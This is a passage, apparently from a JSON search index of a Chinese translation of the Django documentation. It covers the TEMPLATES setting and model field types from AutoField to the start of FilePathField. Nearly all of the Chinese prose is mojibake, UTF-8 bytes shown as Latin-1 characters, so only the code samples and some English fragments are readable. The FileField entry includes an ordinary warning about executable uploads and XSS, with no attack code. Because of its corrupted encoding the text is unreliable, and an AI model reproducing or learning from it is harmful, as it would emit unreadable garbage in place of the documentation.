æ¨¡æ¿å¼•æ“çš„é…ç½®çš„åˆ—è¡¨ã€‚åˆ—è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å„ä¸ªå¼•æ“çš„é€‰é¡¹ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªé…ç½®ï¼Œå‘Šè¯‰ Django æ¨¡æ¿å¼•æ“ä»æ¯ä¸ªå®‰è£…å¥½çš„åº”ç”¨ç¨‹åºä¸­çš„ templates å­ç›®å½•ä¸­åŠ è½½æ¨¡æ¿: TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'APP_DIRS': True, }, ] ä»¥ä¸‹é€‰é¡¹é€‚ç”¨äºæ‰€æœ‰åç«¯ã€‚ BACKEND é»˜è®¤ï¼šæœªå®šä¹‰ è¦ä½¿ç”¨çš„æ¨¡æ¿åç«¯ã€‚å†…ç½®çš„æ¨¡æ¿åç«¯æœ‰ï¼š 'django.template.backends.django.DjangoTemplates' 'django.template.backends.jinja2.Jinja2' ä½ å¯ä»¥é€šè¿‡å°† BACKEND è®¾ç½®ä¸ºä¸€ä¸ªå®Œå…¨é™å®šçš„è·¯å¾„ï¼ˆä¾‹å¦‚ 'mypackage.whatever.Backend' ï¼‰æ¥ä½¿ç”¨ä¸€ä¸ªä¸åœ¨ Django ä¸­çš„æ¨¡æ¿åç«¯ã€‚ NAME é»˜è®¤ï¼šè§ä¸‹æ–¹ è¿™ä¸ªç‰¹å®šæ¨¡æ¿å¼•æ“çš„åˆ«ç§°ã€‚å®ƒæ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼Œå…è®¸é€‰æ‹©ä¸€ä¸ªå¼•æ“è¿›è¡Œæ¸²æŸ“ã€‚æ‰€æœ‰é…ç½®çš„æ¨¡æ¿å¼•æ“çš„åˆ«åå¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚ å®ƒé»˜è®¤ä¸ºå®šä¹‰å¼•æ“ç±»çš„æ¨¡å—åç§°ï¼Œå³ BACKEND çš„ä¸‹ä¸€ä¸ªåˆ°æœ€åä¸€ä¸ªï¼Œå¦‚æœæ²¡æœ‰æä¾›çš„è¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåç«¯æ˜¯ 'mypackage.whatever.Backend' ï¼Œé‚£ä¹ˆå®ƒçš„é»˜è®¤åç§°æ˜¯ 'whatever' ã€‚ DIRS é»˜è®¤ï¼š [] ï¼ˆç©ºåˆ—è¡¨ï¼‰ æŒ‰ç…§æœç´¢é¡ºåºï¼Œå¼•æ“åº”è¯¥æŸ¥æ‰¾æ¨¡æ¿æºæ–‡ä»¶çš„ç›®å½•ã€‚ APP_DIRS é»˜è®¤ï¼š False å¼•æ“æ˜¯å¦åº”è¯¥åœ¨å·²å®‰è£…çš„åº”ç”¨ç¨‹åºä¸­æŸ¥æ‰¾æ¨¡æ¿æºæ–‡ä»¶ã€‚ æ³¨è§£ é»˜è®¤çš„ settings.py æ–‡ä»¶ç”± django-admin startproject åˆ›å»ºï¼Œè®¾ç½® 'APP_DIRS': True ã€‚ OPTIONS é»˜è®¤å€¼ï¼š {} ï¼ˆç©ºå­—å…¸ï¼‰ è¦ä¼ é€’ç»™æ¨¡æ¿åå°çš„é¢å¤–å‚æ•°ã€‚æ ¹æ®æ¨¡æ¿åç«¯çš„ä¸åŒï¼Œå¯ç”¨çš„å‚æ•°ä¹Ÿä¸åŒã€‚ å‚è§ DjangoTemplates å’Œ Jinja2 äº†è§£å†…ç½®åç«¯çš„é€‰é¡¹ å‚è€ƒ: settingé…ç½®","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Settings-commonly-used-field.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Settings-commonly-used-field.html"},{"title":"AutoField","text":"ä¸€ä¸ª IntegerFieldï¼Œæ ¹æ®å¯ç”¨çš„ ID è‡ªåŠ¨é€’å¢ã€‚ä½ é€šå¸¸ä¸éœ€è¦ç›´æ¥ä½¿ç”¨å®ƒï¼›å¦‚æœä½ æ²¡æœ‰æŒ‡å®šï¼Œä¸»é”®å­—æ®µä¼šè‡ªåŠ¨æ·»åŠ åˆ°ä½ çš„æ¨¡å‹ä¸­ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Autofield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Autofield.html"},{"title":"BigAutoField","text":"ä¸€ä¸ª 64 ä½æ•´æ•°ï¼Œä¸ AutoField å¾ˆç›¸ä¼¼ï¼Œä½†ä¿è¯é€‚åˆ 1 åˆ° 9223372036854775807 çš„æ•°å­—ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigautofield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigautofield.html"},{"title":"BigIntegerField","text":"ä¸€ä¸ª 64 ä½çš„æ•´æ•°ï¼Œå’Œ IntegerField å¾ˆåƒï¼Œåªæ˜¯å®ƒä¿è¯é€‚åˆä» -9223372036854775808 åˆ° 9223372036854775807 çš„æ•°å­—ã€‚è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ª NumberInputã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigintegerfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Bigintegerfield.html"},{"title":"BinaryField","text":"ä¸€ä¸ªç”¨äºå­˜å‚¨åŸå§‹äºŒè¿›åˆ¶æ•°æ®çš„å­—æ®µã€‚å¯ä»¥æŒ‡å®šä¸º bytesã€bytearray æˆ– memoryviewã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒBinaryField å°† ediditable` è®¾ç½®ä¸º Falseï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒä¸èƒ½è¢«åŒ…å«åœ¨ ModelForm ä¸­ã€‚ BinaryField æœ‰ä¸€ä¸ªé¢å¤–çš„å¯é€‰å‚æ•°ï¼š BinaryField.max_length The maximum length (in bytes) of the field. The maximum length is enforced in Django's validation using MaxLengthValidator. æ»¥ç”¨ BinaryField è™½ç„¶ä½ å¯èƒ½ä¼šæƒ³åˆ°åœ¨æ•°æ®åº“ä¸­å­˜å‚¨æ–‡ä»¶ï¼Œä½†è€ƒè™‘åˆ°è¿™åœ¨99%çš„æƒ…å†µä¸‹æ˜¯ç³Ÿç³•çš„è®¾è®¡ã€‚è¿™ä¸ªå­—æ®µ ä¸èƒ½ ä»£æ›¿æ­£ç¡®çš„ é™æ€æ–‡ä»¶ å¤„ç†ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Binaryfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Binaryfield.html"},{"title":"BooleanField","text":"ä¸€ä¸ª trueï¼false å­—æ®µã€‚ è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ CheckboxInputï¼Œæˆ–è€…å¦‚æœ null=True åˆ™æ˜¯ NullBooleanSelectã€‚ å½“ Field.default æ²¡æœ‰å®šä¹‰æ—¶ï¼ŒBooleanField çš„é»˜è®¤å€¼æ˜¯ Noneã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Booleanfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Booleanfield.html"},{"title":"DateField","text":"ä¸€ä¸ªæ—¥æœŸï¼Œåœ¨ Python ä¸­ç”¨ä¸€ä¸ª datetime.date å®ä¾‹è¡¨ç¤ºã€‚æœ‰ä¸€äº›é¢å¤–çš„ã€å¯é€‰çš„å‚æ•°ã€‚ DateField.auto_now æ¯æ¬¡ä¿å­˜å¯¹è±¡æ—¶ï¼Œè‡ªåŠ¨å°†è¯¥å­—æ®µè®¾ç½®ä¸ºç°åœ¨ã€‚ å¯¹äº\"æœ€åä¿®æ”¹\"çš„æ—¶é—´æˆ³å¾ˆæœ‰ç”¨ã€‚è¯·æ³¨æ„ï¼Œå½“å‰æ—¥æœŸ æ€»æ˜¯ è¢«ä½¿ç”¨ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸€ä¸ªä½ å¯ä»¥è¦†ç›–çš„é»˜è®¤å€¼ã€‚ åªæœ‰åœ¨è°ƒç”¨ Model.save() æ—¶ï¼Œè¯¥å­—æ®µæ‰ä¼šè‡ªåŠ¨æ›´æ–°ã€‚ å½“ä»¥å…¶ä»–æ–¹å¼å¯¹å…¶ä»–å­—æ®µè¿›è¡Œæ›´æ–°æ—¶ï¼Œå¦‚ QuerySet.update()ï¼Œ è¯¥å­—æ®µä¸ä¼šè¢«æ›´æ–°ï¼Œå°½ç®¡ä½ å¯ä»¥åœ¨è¿™æ ·çš„æ›´æ–°ä¸­ä¸ºè¯¥å­—æ®µæŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰å€¼ã€‚ DateField.auto_now_add å½“ç¬¬ä¸€æ¬¡åˆ›å»ºå¯¹è±¡æ—¶ï¼Œè‡ªåŠ¨å°†è¯¥å­—æ®µè®¾ç½®ä¸ºç°åœ¨ã€‚ å¯¹åˆ›å»ºæ—¶é—´æˆ³å¾ˆæœ‰ç”¨ã€‚è¯·æ³¨æ„ï¼Œå½“å‰æ—¥æœŸæ˜¯ å§‹ç»ˆ ä½¿ç”¨çš„ï¼› å®ƒä¸æ˜¯ä¸€ä¸ªä½ å¯ä»¥è¦†ç›–çš„é»˜è®¤å€¼ã€‚å› æ­¤ï¼Œå³ä½¿ä½ åœ¨åˆ›å»ºå¯¹è±¡æ—¶ä¸ºè¯¥å­—æ®µè®¾ç½®äº†ä¸€ä¸ªå€¼ï¼Œå®ƒä¹Ÿä¼šè¢«å¿½ç•¥ã€‚ å¦‚æœä½ æƒ³ä¿®æ”¹è¿™ä¸ªå­—æ®µï¼Œå¯ä»¥è®¾ç½®ä»¥ä¸‹å†…å®¹æ¥ä»£æ›¿ auto_now_add=True ï¼š å¯¹äº DateField: default=date.today â€”â€”æ¥è‡ª datetime.date.today() å¯¹äº DateTimeField: default=timezone.now â€”â€”æ¥è‡ª django.utils.timezone.now() è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ª DateInputã€‚ç®¡ç†ä¸­å¢åŠ äº†ä¸€ä¸ª JavaScript æ—¥å†ï¼Œ ä»¥åŠ\"ä»Šå¤©\"çš„å¿«æ·æ–¹å¼ã€‚åŒ…å«ä¸€ä¸ªé¢å¤–çš„ invalid_date é”™è¯¯ä¿¡æ¯é”®ã€‚ auto_now_addã€auto_now å’Œ default é€‰é¡¹æ˜¯ç›¸äº’æ’æ–¥çš„ã€‚è¿™äº›é€‰é¡¹çš„ä»»ä½•ç»„åˆéƒ½ä¼šå¯¼è‡´é”™è¯¯ã€‚ æ³¨è§£ ç›®å‰ï¼Œå°† auto_now æˆ– auto_now_add è®¾ç½®ä¸º Trueï¼Œå°†å¯¼è‡´è¯¥å­—æ®µè®¾ç½®ä¸º editable=False å’Œ blank=Trueã€‚ auto_now å’Œ auto_now_add é€‰é¡¹å°†å§‹ç»ˆä½¿ç”¨åˆ›å»ºæˆ–æ›´æ–°æ—¶ é»˜è®¤æ—¶åŒº çš„æ—¥æœŸã€‚ å¦‚æœä½ éœ€è¦ä¸€äº›ä¸åŒçš„ä¸œè¥¿ï¼Œä½ å¯èƒ½éœ€è¦è€ƒè™‘ä½¿ç”¨ä½ è‡ªå·±çš„å¯è°ƒç”¨çš„é»˜è®¤å€¼ï¼Œæˆ–è€…è¦†ç›– save() è€Œä¸æ˜¯ä½¿ç”¨ auto_now æˆ– auto_now_add ï¼› æˆ–è€…ä½¿ç”¨ DateTimeField è€Œä¸æ˜¯ DateFieldï¼Œå¹¶å†³å®šå¦‚ä½•åœ¨æ˜¾ç¤ºæ—¶é—´å¤„ç†ä»æ—¥æœŸæ—¶é—´åˆ°æ—¥æœŸçš„è½¬æ¢ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Datefield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Datefield.html"},{"title":"DateTimeField","text":"ä¸€ä¸ªæ—¥æœŸå’Œæ—¶é—´ï¼Œåœ¨ Python ä¸­ç”¨ä¸€ä¸ª datetime.datetime å®ä¾‹è¡¨ç¤ºã€‚ä¸ DateField ä¸€æ ·ï¼Œä½¿ç”¨ç›¸åŒçš„é¢å¤–å‚æ•°: class DateTimeField(auto_now=False, auto_now_add=False, \\*\\*options) è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ªå•ç‹¬çš„ DateTimeInputã€‚ç®¡ç†ä¸­ä½¿ç”¨ä¸¤ä¸ªå•ç‹¬çš„ TextInput éƒ¨ä»¶ï¼Œå¹¶ä½¿ç”¨ JavaScript å¿«æ·æ–¹å¼ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Datetimefield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Datetimefield.html"},{"title":"DecimalField","text":"ä¸€ä¸ªå›ºå®šç²¾åº¦çš„åè¿›åˆ¶æ•°ï¼Œåœ¨ Python ä¸­ç”¨ä¸€ä¸ª Decimal å®ä¾‹æ¥è¡¨ç¤ºã€‚å®ƒä½¿ç”¨ DecimalValidator éªŒè¯è¾“å…¥: class DecimalField(max_digits=None, decimal_places=None, **options) æœ‰ä¸¤ä¸ª å¿…è¦çš„ å‚æ•°ï¼š DecimalField.max_digits æ•°å­—ä¸­å…è®¸çš„æœ€å¤§ä½æ•°ã€‚è¯·æ³¨æ„ï¼Œè¿™ä¸ªæ•°å­—å¿…é¡»å¤§äºæˆ–ç­‰äº decimal_placesã€‚ DecimalField.decimal_places ä¸æ•°å­—ä¸€èµ·å­˜å‚¨çš„å°æ•°ä½æ•°ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¦å­˜å‚¨ç²¾åº¦ä¸ºå°æ•°ç‚¹åä¸¤ä½çš„ 999 çš„æ•°å­—ï¼Œä½ å¯ä»¥ä½¿ç”¨: models.DecimalField(..., max_digits=5, decimal_places=2) å¹¶ä»¥ 10 ä½å°æ•°çš„ç²¾åº¦æ¥å­˜å‚¨æœ€å¤šçº¦ 10 äº¿çš„æ•°å­—: models.DecimalField(..., max_digits=19, decimal_places=10) å½“ localize ä¸º False æ—¶æ˜¯ NumberInput å¦åˆ™ï¼Œè¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ TextInputã€‚ æ³¨è§£ å…³äº FloatField å’Œ DecimalField ç±»ä¹‹é—´å·®å¼‚çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚è§ FloatField vs. DecimalFieldã€‚ä½ è¿˜åº”è¯¥æ³¨æ„å°æ•°å­—æ®µçš„ SQLite é™åˆ¶ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Decimalfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Decimalfield.html"},{"title":"DurationField","text":"ä¸€ä¸ªç”¨äºå­˜å‚¨æ—¶é—´æ®µçš„å­—æ®µâ€”â€”åœ¨ Python ä¸­ç”¨ timedelta å»ºæ¨¡ã€‚ å½“åœ¨ PostgreSQL ä¸Šä½¿ç”¨æ—¶ï¼Œä½¿ç”¨çš„æ•°æ®ç±»å‹æ˜¯ intervalï¼Œ åœ¨ Oracle ä¸Šä½¿ç”¨çš„æ•°æ®ç±»å‹æ˜¯ INTERVAL DAY(9) TO SECOND(6)ã€‚å¦åˆ™ä½¿ç”¨å¾®ç§’çš„ bigint: class DurationField(**options) æ³¨è§£ DurationField çš„ç®—æœ¯åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯å¯è¡Œçš„ã€‚ ä½†åœ¨ PostgreSQL ä»¥å¤–çš„æ‰€æœ‰æ•°æ®åº“ä¸­ï¼Œå°† DurationField çš„å€¼ä¸ DateTimeField å®ä¾‹ä¸Šçš„ç®—æœ¯è¿›è¡Œæ¯”è¾ƒï¼Œå°†æ— æ³•è¾¾åˆ°é¢„æœŸçš„æ•ˆæœã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-DurationField.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-DurationField.html"},{"title":"EmailField","text":"ä¸€ä¸ª CharFieldï¼Œä½¿ç”¨ EmailValidator æ¥æ£€æŸ¥è¯¥å€¼æ˜¯å¦ä¸ºæœ‰æ•ˆçš„ç”µå­é‚®ä»¶åœ°å€: class EmailField(max_length=254, **options)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Emailfield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Emailfield.html"},{"title":"FileField","text":"ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å­—æ®µ: class FileField(upload_to=None, max_length=100, \\*\\*options) æ³¨è§£ primary_key å‚æ•°ä¸æ”¯æŒï¼Œå¦‚æœä½¿ç”¨ï¼Œä¼šå¼•èµ·é”™è¯¯ã€‚ æœ‰ä¸¤ä¸ªå¯é€‰å‚æ•°ï¼š FileField.upload_to è¿™ä¸ªå±æ€§æä¾›äº†ä¸€ç§è®¾ç½®ä¸Šä¼ ç›®å½•å’Œæ–‡ä»¶åçš„æ–¹å¼ï¼Œå¯ä»¥æœ‰ä¸¤ç§è®¾ç½®æ–¹å¼ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå€¼éƒ½ä¼šä¼ é€’ç»™ Storage.save() æ–¹æ³•ã€‚ å¦‚æœä½ æŒ‡å®šä¸€ä¸ªå­—ç¬¦ä¸²å€¼æˆ–ä¸€ä¸ª Pathï¼Œå®ƒå¯èƒ½åŒ…å« strftime() æ ¼å¼ï¼Œ å®ƒå°†è¢«æ–‡ä»¶ä¸Šä¼ çš„æ—¥æœŸï¼æ—¶é—´æ‰€ä»£æ›¿ï¼ˆè¿™æ ·ä¸Šä¼ çš„æ–‡ä»¶å°±ä¸ä¼šå¡«æ»¡æŒ‡å®šçš„ç›®å½•ï¼‰ã€‚ä¾‹å¦‚: class MyModel(models.Model): # file will be uploaded to MEDIA_ROOT/uploads upload = models.FileField(upload_to='uploads/') # or... # file will be saved to MEDIA_ROOT/uploads/2015/01/30 upload = models.FileField(upload_to='uploads/%Y/%m/%d/') å¦‚æœä½ ä½¿ç”¨çš„æ˜¯é»˜è®¤çš„ FileSystemStorageï¼Œè¿™ä¸ªå­—ç¬¦ä¸²çš„å€¼å°†è¢«é™„åŠ åˆ°ä½ çš„ MEDIA_ROOT è·¯å¾„åé¢ï¼Œ å½¢æˆæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨ä½ç½®ã€‚ å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ä¸åŒçš„å­˜å‚¨ç³»ç»Ÿï¼Œè¯·æ£€æŸ¥è¯¥å­˜å‚¨ç³»ç»Ÿçš„æ–‡æ¡£ï¼Œçœ‹çœ‹å®ƒæ˜¯å¦‚ä½•å¤„ç† upload_to çš„ã€‚ upload_to ä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå¦‚å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°å°†è¢«è°ƒç”¨ä»¥è·å¾—ä¸Šä¼ è·¯å¾„ï¼ŒåŒ…æ‹¬æ–‡ä»¶åã€‚ è¿™ä¸ªå¯è°ƒç”¨å¯¹è±¡å¿…é¡»æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ª Unix é£æ ¼çš„è·¯å¾„ï¼ˆå¸¦æ–œçº¿ï¼‰ï¼Œä»¥ä¾¿ä¼ ç»™å­˜å‚¨ç³»ç»Ÿã€‚è¿™ä¸¤ä¸ªå‚æ•°æ˜¯ï¼š instance å®šä¹‰ FileField çš„æ¨¡å‹å®ä¾‹ã€‚æ›´å…·ä½“åœ°è¯´ï¼Œè¿™æ˜¯é™„åŠ å½“å‰æ–‡ä»¶çš„ç‰¹å®šå®ä¾‹ã€‚ åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå¯¹è±¡è¿˜æ²¡æœ‰è¢«ä¿å­˜åˆ°æ•°æ®åº“ï¼Œæ‰€ä»¥å¦‚æœå®ƒä½¿ç”¨é»˜è®¤çš„ AutoFieldï¼Œå®ƒçš„ä¸»é”®å­—æ®µå¯èƒ½è¿˜æ²¡æœ‰ä¸€ä¸ªå€¼ã€‚ filename æœ€åˆç»™æ–‡ä»¶çš„æ–‡ä»¶åã€‚åœ¨ç¡®å®šæœ€ç»ˆç›®æ ‡è·¯å¾„æ—¶ï¼Œå¯èƒ½ä¼šè€ƒè™‘åˆ°ï¼Œä¹Ÿå¯èƒ½ä¸ä¼šè€ƒè™‘åˆ°ã€‚ ä¾‹å­: def user_directory_path(instance, filename): # file will be uploaded to MEDIA_ROOT/user_<id>/<filename> return 'user_{0}/{1}'.format(instance.user.id, filename) class MyModel(models.Model): upload = models.FileField(upload_to=user_directory_path) FileField.storage ä¸€ä¸ªå­˜å‚¨å¯¹è±¡ï¼Œæˆ–æ˜¯ä¸€ä¸ªè¿”å›å­˜å‚¨å¯¹è±¡çš„å¯è°ƒç”¨å¯¹è±¡ã€‚å®ƒå¤„ç†ä½ çš„æ–‡ä»¶çš„å­˜å‚¨å’Œæ£€ç´¢ã€‚å‚è§ ç®¡ç†æ–‡ä»¶ï¼Œäº†è§£å¦‚ä½•æä¾›è¿™ä¸ªå¯¹è±¡ã€‚ Changed in Django 3.1: å¢åŠ äº†æä¾›å¯è°ƒç”¨å¯¹è±¡çš„èƒ½åŠ›ã€‚ è¯¥å­—æ®µçš„é»˜è®¤è¡¨å•éƒ¨ä»¶æ˜¯ä¸€ä¸ª ClearableFileInputã€‚ åœ¨æ¨¡å‹ä¸­ä½¿ç”¨ FileField æˆ– ImageField ï¼ˆè§ä¸‹æ–‡ï¼‰éœ€è¦å‡ ä¸ªæ­¥éª¤ï¼š åœ¨ä½ çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œä½ éœ€è¦å®šä¹‰ MEDIA_ROOT ä½œä¸ºä½ å¸Œæœ› Django å­˜å‚¨ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•çš„å®Œæ•´è·¯å¾„ã€‚ ï¼ˆä¸ºäº†ä¿è¯æ€§èƒ½ï¼Œè¿™äº›æ–‡ä»¶ä¸å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚ï¼‰ å®šä¹‰ MEDIA_URL ä½œä¸ºè¯¥ç›®å½•çš„åŸºæœ¬å…¬å…± URLã€‚ç¡®ä¿è¿™ä¸ªç›®å½•æ˜¯ Web æœåŠ¡å™¨çš„ç”¨æˆ·è´¦å·å¯ä»¥å†™çš„ã€‚ å°† FileField æˆ– ImageField æ·»åŠ åˆ°ä½ çš„æ¨¡å‹ä¸­ï¼Œå®šä¹‰ upload_to é€‰é¡¹ï¼ŒæŒ‡å®š MEDIA_ROOT çš„å­ç›®å½•ï¼Œç”¨äºä¸Šä¼ æ–‡ä»¶ã€‚ æ‰€æœ‰è¿™äº›å°†è¢«å­˜å‚¨åœ¨ä½ çš„æ•°æ®åº“ä¸­çš„æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„è·¯å¾„ï¼ˆç›¸å¯¹äº MEDIA_ROOT ï¼‰ã€‚ ä½ å¾ˆå¯èƒ½è¦ä½¿ç”¨ Django æä¾›çš„æ–¹ä¾¿çš„ url å±æ€§ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ çš„ ImageField å«åš mug_shotï¼Œä½ å¯ä»¥åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨ {{ object.mug_shot.url }} è·å–å›¾ç‰‡çš„ç»å¯¹è·¯å¾„ã€‚ ä¾‹å¦‚ï¼Œä½ çš„ MEDIA_ROOT è®¾ç½®ä¸º '/home/media'ï¼Œ upload_to è®¾ç½®ä¸º 'photos/%Y/%m/%d'ã€‚ upload_to ä¸­çš„ '%Y/%m/%d' éƒ¨åˆ†æ˜¯ strftime() æ ¼å¼åŒ–ï¼Œ '%Y' æ˜¯å››ä½æ•°çš„å¹´ï¼Œ'%m' æ˜¯ä¸¤ä½æ•°çš„æœˆï¼Œ'%d' æ˜¯ä¸¤ä½æ•°çš„æ—¥ã€‚ å¦‚æœä½ åœ¨ 2007 å¹´ 1 æœˆ 15 æ—¥ä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒå°†è¢«ä¿å­˜åœ¨ /home/media/photos/2007/01/15 ç›®å½•ä¸‹ã€‚ å¦‚æœä½ æƒ³æ£€ç´¢ä¸Šä¼ æ–‡ä»¶çš„ç›˜ä¸Šæ–‡ä»¶åï¼Œæˆ–è€…æ–‡ä»¶çš„å¤§å°ï¼Œå¯ä»¥åˆ†åˆ«ä½¿ç”¨ name å’Œ size å±æ€§ï¼›å…³äºå¯ç”¨å±æ€§å’Œæ–¹æ³•çš„æ›´å¤šä¿¡æ¯ï¼Œ è¯·å‚è§ File ç±»å‚è€ƒå’Œ ç®¡ç†æ–‡ä»¶ ä¸»é¢˜æŒ‡å—ã€‚ æ³¨è§£ æ–‡ä»¶åœ¨æ•°æ®åº“ä¸­ä½œä¸ºä¿å­˜æ¨¡å‹çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤åœ¨æ¨¡å‹è¢«ä¿å­˜ä¹‹å‰ï¼Œä¸èƒ½ä¾èµ–ç£ç›˜ä¸Šä½¿ç”¨çš„å®é™…æ–‡ä»¶åã€‚ ä¸Šä¼ çš„æ–‡ä»¶çš„ç›¸å¯¹ URL å¯ä»¥é€šè¿‡ url å±æ€§è·å¾—ã€‚å†…éƒ¨è°ƒç”¨åº•å±‚ Storage ç±»çš„ store() æ–¹æ³•ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ— è®ºä½•æ—¶å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä½ éƒ½åº”è¯¥å¯†åˆ‡å…³æ³¨ä½ ä¸Šä¼ çš„æ–‡ä»¶åœ¨å“ªé‡Œï¼Œ æ˜¯ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶ï¼Œä»¥é¿å…å®‰å…¨æ¼æ´ã€‚å¯¹æ‰€æœ‰ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡ŒéªŒè¯ï¼Œè¿™æ ·ä½ æ‰èƒ½ç¡®å®šæ–‡ä»¶æ˜¯ä½ è®¤ä¸ºçš„é‚£æ ·ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½ ç›²ç›®åœ°è®©åˆ«äººä¸Šä¼ æ–‡ä»¶ï¼Œä¸ç»è¿‡éªŒè¯ï¼Œå°±ä¸Šä¼ æ–‡ä»¶åˆ°ä½ çš„ Web æœåŠ¡å™¨çš„æ–‡æ¡£æ ¹ç›®å½•ä¸‹ï¼Œ é‚£ä¹ˆæœ‰äººå°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ª CGI æˆ– PHP è„šæœ¬ï¼Œå¹¶é€šè¿‡è®¿é—®å®ƒçš„ URL åœ¨ä½ çš„ç½‘ç«™ä¸Šæ‰§è¡Œè¯¥è„šæœ¬ã€‚ä¸è¦å…è®¸è¿™ç§æƒ…å†µå‘ç”Ÿã€‚ å¦å¤–è¦æ³¨æ„çš„æ˜¯ï¼Œå³ä½¿æ˜¯ä¸Šä¼ çš„ HTML æ–‡ä»¶ï¼Œç”±äºå¯ä»¥è¢«æµè§ˆå™¨æ‰§è¡Œï¼ˆè™½ç„¶ä¸èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œï¼‰ï¼Œä¹Ÿä¼šé€ æˆç›¸å½“äº XSS æˆ– CSRF æ”»å‡»çš„å®‰å…¨å¨èƒã€‚ FileField å®ä¾‹åœ¨æ•°æ®åº“ä¸­è¢«åˆ›å»ºä¸º varchar åˆ—ï¼Œé»˜è®¤æœ€å¤§é•¿åº¦ä¸º 100 ä¸ªå­—ç¬¦ã€‚ä¸å…¶ä»–å­—æ®µä¸€æ ·ï¼Œä½ å¯ä»¥ä½¿ç”¨ max_length å‚æ•°æ”¹å˜æœ€å¤§é•¿åº¦ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Filefield.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Supported-Field-Filefield.html"},{"title":"FilePathField","text":"ä¸€ä¸ª CharFieldï¼Œå…¶é€‰æ‹©ä»…é™äºæ–‡ä»¶ç³»ç»Ÿä¸­æŸä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶åã€‚æœ‰ä¸€äº›ç‰¹æ®Šçš„å‚æ•°ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ å¿…é¡»çš„: class FilePathField(path='', match=None, recursive=False, allow_files=True, allow_folders=False, max_length=100,\\ *\\*options) FilePathField.path 